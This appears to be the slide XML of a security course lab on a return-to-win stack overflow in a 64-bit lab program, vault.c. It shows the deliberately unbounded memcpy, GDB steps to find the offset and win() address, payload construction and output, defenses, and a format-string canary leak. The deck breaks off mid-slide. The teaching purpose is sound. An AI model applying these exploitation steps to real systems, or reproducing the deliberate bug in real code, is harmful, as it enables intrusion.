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ASLR = Address space Layout Randomization</a:t>
            </a:r>
            <a:endParaRPr/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 Overflow Attack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868680" y="34290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Part 2 — Returning to win() on a 64-bit target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Part 1 to Lab 2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594360" y="1554480"/>
            <a:ext cx="1088136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 1 showed the core idea: an overflow can overwrite the saved return address and redirect control flow.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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Lab 2 keeps that idea but changes the setting:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="1" marL="548640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–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64-bit (x86-64), not 32-bit — registers are %rsp / %rbp, addresses are 8 bytes.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="1" marL="548640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–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stack is non-executable (NX). We do NOT inject or run shellcode.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="1" marL="548640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–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Instead we return into a function that already exists in the program: win().</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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technique is called return-to-win (a minimal return-oriented attack).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Ways to Hijack a Return Address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731520" y="14630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 1 — code injection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731520" y="1965960"/>
            <a:ext cx="521208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Place malicious bytes (shellcode) in the buffer.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032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Overwrite the return address to point INTO the buffer.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032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CPU executes the bytes you supplied.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032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Blocked when the stack is non-executable (NX / DEP).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 2 — return-to-win (code reuse)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6400800" y="1965960"/>
            <a:ext cx="530352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Inject NO code at all.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032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Overwrite the return address with the address of an existing function: win().</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032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CPU 'returns' into win(), which runs normally.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032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Works even with NX on — we only reuse existing code.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Target: vault.c</a:t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594360" y="1417320"/>
            <a:ext cx="7772400" cy="493776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850" lIns="128000" spcFirstLastPara="1" rIns="7315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static void win(void) {                 // the goal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puts("LAB2-WIN:vault-4a44dc15");     // build-specific token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fflush(stdout);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static void check_request(const unsigned char *input,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size_t len)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volatile unsigned long padding[PAD_WORDS];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char note[NOTE_SIZE];                // 56 bytes in this build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if (len &lt; 4) { puts("(malformed request)"); return;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memcpy(note, input, len);            // &lt;-- the bug: no bound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int main(void)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unsigned char input[MAX_REQUEST];    // up to 512 bytes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size_t len = fread(input, 1, sizeof(input), stdin);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check_request(input, len);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8595360" y="1554480"/>
            <a:ext cx="32918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win() is never called by the program.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="40404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It just prints your token. Reaching it is the whole goal.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="40404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check_request() copies attacker-controlled input into a small fixed buffer.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="40404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note holds 56 bytes; input can be up to 512.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Vulnerability</a:t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731520" y="1554480"/>
            <a:ext cx="7498079" cy="1371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850" lIns="128000" spcFirstLastPara="1" rIns="7315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char note[NOTE_SIZE];         // 56 bytes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memcpy(note, input, len);     // len can be up to 512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731520" y="310896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memcpy copies len bytes with no check that len &lt;= sizeof(note).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="90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If len &gt; 56, the copy runs off the end of note and writes over whatever follows it on the stack:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="1" marL="548640" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="404040"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Arial"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="17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saved frame pointer (saved %rbp),</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="1" marL="548640" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="900"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="404040"/>
              </a:buClr>
              <a:buSzPts val="1700"/>
              <a:buFont typeface="Arial"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="17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then the saved return address (saved %rip).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="90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memcpy copies raw bytes — unlike strcpy it does not stop at a 0x00 byte, so any address can be written.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="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what sits in the saved return address  =&gt;  control where the function returns.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x86-64 Stack Frame Refresher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685800" y="1554480"/>
            <a:ext cx="64922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On entry a function saves the caller's %rbp, then uses %rbp to anchor the frame.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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Two saved values sit just above the locals:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="1" marL="548640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700"/>
              <a:buFont typeface="Arial"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="17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saved %rbp  at  [%rbp]</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="1" marL="548640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700"/>
              <a:buFont typeface="Arial"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="17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saved return address (%rip)  at  [%rbp + 8]</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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ret pops the 8 bytes at the top of the stack into %rip and jumps there.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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Addresses are 8 bytes, stored little-endian (least-significant byte first).</a:t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7955279" y="1600200"/>
            <a:ext cx="3383280" cy="566928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saved return addr  [rbp+8]</a:t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7955279" y="2167128"/>
            <a:ext cx="3383280" cy="566928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saved rbp          [rbp]</a:t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7955279" y="2734056"/>
            <a:ext cx="3383280" cy="566928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local variables</a:t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7955279" y="3300984"/>
            <a:ext cx="3383280" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9D9D9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note[ ]  (buffer)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11384280" y="136245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high addr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11384280" y="382219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low addr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7818119" y="394106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stack grows down ↓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Plan: Overwrite Saved %rip with &amp;win</a:t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4480560" y="1508760"/>
            <a:ext cx="3931920" cy="868680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saved return address  (8 B)</a:t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4480560" y="2377439"/>
            <a:ext cx="3931920" cy="86868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saved %rbp  (8 B)</a:t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4480560" y="3246120"/>
            <a:ext cx="3931920" cy="86868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padding[1]  (8 B)</a:t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4480560" y="4114800"/>
            <a:ext cx="3931920" cy="868680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9D9D9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note[56]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3063240" y="176479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offset 72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3063240" y="263347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offset 64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3063240" y="350215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offset 56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3063240" y="437083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offset 0</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="151" name="Google Shape;151;p19"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="8439840" y="1938528"/>
            <a:ext cx="1710000" cy="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19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10195559" y="1618488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&amp;win here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(0x4011d6)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8458200" y="12527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8458200" y="4937759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731520" y="5212079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Fill 72 bytes to reach the saved return address, then write the 8-byte address of win().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 — Find the Address of win() in GDB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685800" y="1463040"/>
            <a:ext cx="1124712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vuln build is -no-pie, so win() sits at a fixed address — GDB prints it directly, no need to run the program yet:</a:t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731520" y="2377440"/>
            <a:ext cx="8321040" cy="20574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850" lIns="128000" spcFirstLastPara="1" rIns="7315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$ gdb ./vault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(gdb) print &amp;win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$1 = (void (*)(void)) 0x4011d6 &lt;win&gt;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(gdb) info address win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Symbol "win" is a function at address 0x4011d6.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731520" y="4663440"/>
            <a:ext cx="1124712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win() = 0x4011d6 in this build.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032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Use  p &amp;win  for the entry address (break win lands a few bytes in, past endbr64).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032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Your build's address and token differ — always read them from YOUR binary.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2 — Find the Offset in GDB</a:t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640080" y="1463040"/>
            <a:ext cx="7589520" cy="356616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850" lIns="128000" spcFirstLastPara="1" rIns="7315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(gdb) break check_request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(gdb) run &lt; tests/accept.bin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(gdb) print &amp;note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$1 = (char (*)[56]) 0x7fffffff8cf0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(gdb) print $rbp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$2 = (void *) 0x7fffffff8d30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(gdb) print (char*)($rbp+8) - (char*)note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$3 = 72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8412480" y="1554480"/>
            <a:ext cx="356616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saved return address is at $rbp + 8.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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offset = (rbp+8) − &amp;note = 72 bytes.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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That is 56 (note) + 8 (padding) + 8 (saved rbp).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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x/40gx note shows the same bytes if you prefer to read the frame directly.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3 — Build payload.bin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685800" y="1417320"/>
            <a:ext cx="1133856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Give the two values you measured in Steps 1-2 to exploit.py; it assembles the bytes and writes payload.bin:</a:t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731520" y="2148840"/>
            <a:ext cx="10058400" cy="16002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850" lIns="128000" spcFirstLastPara="1" rIns="7315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$ python3 exploit.py --offset 72 --win 0x4011d6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[*] offset = 72 filler byte(s) ('A')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[*] win    = 0x4011d6  -&gt;  little-endian  d6 11 40 00 00 00 00 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[+] wrote payload.bin (80 bytes)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731520" y="3977639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payload is simply:   72 filler bytes   +   &amp;win as 8 little-endian bytes</a:t>
            </a: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731520" y="4480560"/>
            <a:ext cx="7132320" cy="658368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850" lIns="128000" spcFirstLastPara="1" rIns="7315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0x00000000004011d6   -&gt;   d6 11 40 00 00 00 00 00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731520" y="5394960"/>
            <a:ext cx="1133856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72 filler bytes only move the write cursor to the saved return address; the last 8 bytes are &amp;win.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="70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exploit.py does NOT find the values for you — you supply the offset and address you read in GDB.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4 — Run It</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="194" name="Google Shape;194;p23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1508760"/>
            <a:ext cx="8412480" cy="210312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850" lIns="128000" spcFirstLastPara="1" rIns="7315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$ ./vault &lt; payload.bin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vault build 4a44dc15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request rejected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LAB2-WIN:vault-4a44dc15          &lt;-- success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Segmentation fault (core dumped)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731520" y="3749039"/>
            <a:ext cx="1115568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token prints — control reached win(). That is what the grader checks.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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"request rejected" is normal: note now starts with 'AAAA', not 'OPEN'.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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segfault AFTER the token is expected and harmless: win() returns into the 'A' filler, which is not a valid address. The win() output has already been produced.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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(Optional polish: return cleanly by chaining a real return address after &amp;win.)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 Works</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="203" name="Google Shape;203;p24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1600200"/>
            <a:ext cx="640080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check_request() finishes and executes ret.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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ret pops the 8 bytes at the top of the stack into %rip — but those 8 bytes are now &amp;win, not the real caller.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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CPU jumps to win(), which prints the token.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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code was injected; we only redirected an existing return.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="204" name="Google Shape;204;p24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="1600200"/>
            <a:ext cx="3657600" cy="822960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&amp;win  (0x4011d6)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="205" name="Google Shape;205;p24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="2423160"/>
            <a:ext cx="3657600" cy="82296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'AAAA...' (saved rbp)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="206" name="Google Shape;206;p24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="3246120"/>
            <a:ext cx="3657600" cy="82296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'AAAA...' (padding)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="207" name="Google Shape;207;p24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="4069080"/>
            <a:ext cx="3657600" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9D9D9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'AAAA...' (note[56])</a:t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7589520" y="500176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  pops  %rip  ───►  win()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GDB Quick Reference</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="216" name="Google Shape;216;p25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="10881360" cy="32004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850" lIns="128000" spcFirstLastPara="1" rIns="7315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break check_request       # stop inside the vulnerable function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run &lt; tests/accept.bin    # feed a benign request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info frame                # frame layout, saved rip location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print &amp;note               # address of the buffer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print $rbp                # frame pointer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x/40gx note               # dump 40 giant (8-byte) words as hex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print &amp;win                # address of the target function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p (char*)($rbp+8)-(char*)note   # the offset you need</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="217" name="Google Shape;217;p25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="493776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gx = giant word (8 bytes), the natural size on x86-64. (Part 1 used wx, 4 bytes.)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="9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saved return address is the 8-byte value at $rbp + 8.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="218" name="Google Shape;218;p2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219" name="Google Shape;219;p25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Stopping the Attack: The Defenses</a:t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685800" y="1463040"/>
            <a:ext cx="11338500" cy="3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ungraded target was built with every protection OFF. Real builds add layers, each aimed at a different step of the attack:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="11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Bounds-checked copy (the real fix) — the copy can't run past the buffer, so there is no overflow at all.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="11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NX / DEP — the stack is non-executable; stops INJECTED shellcode. (ret2win sidesteps it by reusing existing code.)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="11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ASLR / PIE — win()'s address is randomized every run, so you no longer know where to jump.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="110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Stack canary — a random guard that detects a clobbered return address before the function returns.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="11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FORTIFY_SOURCE — libc checks the size on memcpy/strcpy and aborts an oversized copy.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="226" name="Google Shape;226;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="6080760"/>
            <a:ext cx="11338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graded lab turns ON one of these — the stack canary — and leaves the rest off, so you can study it closely.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="227" name="Google Shape;227;p2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Graded Lab: Defeat the Stack Canary</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="234" name="Google Shape;234;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1554480"/>
            <a:ext cx="64922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graded vault is compiled with -fstack-protector-strong.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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 random 8-byte canary is placed between the buffer and the saved return address, and checked just before ret.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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To reach the return address, your overflow must cross the canary.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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Overwrite it with the wrong value and the program aborts — *** stack smashing detected *** — BEFORE ret runs.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="235" name="Google Shape;235;p27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="1600200"/>
            <a:ext cx="3749039" cy="822960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saved return address</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="236" name="Google Shape;236;p27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="2423160"/>
            <a:ext cx="3749039" cy="82296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saved rbp</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="237" name="Google Shape;237;p27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="3246120"/>
            <a:ext cx="3749039" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9D9D9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CANARY (random)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="238" name="Google Shape;238;p27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7863840" y="4069080"/>
            <a:ext cx="3749039" cy="82296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note[ ]  buffer</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="239" name="Google Shape;239;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7772400" y="4983479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overflow writes upward ↑</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="240" name="Google Shape;240;p2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241" name="Google Shape;241;p27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Canary's Weakness: Leak and Replay</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="247" name="Google Shape;247;p28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1554480"/>
            <a:ext cx="110643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canary is re-randomized on every run, so you cannot guess it (~2^56 possibilities — brute force is hopeless).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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the check only COMPARES values. If you read the live canary and write the same bytes back, the check passes.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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So the attack becomes three moves, all in one run:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="1" marL="548640" marR="0" rtl="0" algn="l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Char char="–"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read the current canary,</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="1" marL="548640" marR="0" rtl="0" algn="l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Char char="–"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overflow while putting that exact value back in its slot,</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="1" marL="548640" marR="0" rtl="0" algn="l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Char char="–"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 still overwrite the saved return address with &amp;win.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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You need a way to read memory from the running process — that is the next slide.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="248" name="Google Shape;248;p2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249" name="Google Shape;249;p28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Reading the Canary: the Format-String Bug</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="255" name="Google Shape;255;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1417320"/>
            <a:ext cx="1143000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program uses your input as a printf format string:  printf(buf),  not  printf("%s", buf).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="9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Specifiers like %p then print values straight off the stack — including the canary. %N$p reads slot N (8 bytes).</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="256" name="Google Shape;256;p29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2697480"/>
            <a:ext cx="10789920" cy="6400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850" lIns="128000" spcFirstLastPara="1" rIns="7315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name = "%15$p"   -&gt;   hello, 0x2f9a29d1fa7d3900      (the live canary)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="257" name="Google Shape;257;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="36118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not just read the canary in GDB?</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="258" name="Google Shape;258;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="411480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GDB shows the canary for THAT debugging run. Your exploit — and the grader — start a FRESH process with a DIFFERENT canary.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l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value must be read live, from the same process you overflow. That is exactly what this bug is for.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032" lvl="0" marL="256032" marR="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="7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%N$p index is fixed — you find it once. The canary VALUE changes every run.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="259" name="Google Shape;259;p2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260" name="Google Shape;260;p29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Attack, End to End</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="266" name="Google Shape;266;p30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1463040"/>
            <a:ext cx="1143000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Phase 1 — leak: send a format string as the name; read the live canary from the reply.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr indent="-256032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Phase 2 — smash: send a length-prefixed overflow built from that leak:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="267" name="Google Shape;267;p30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
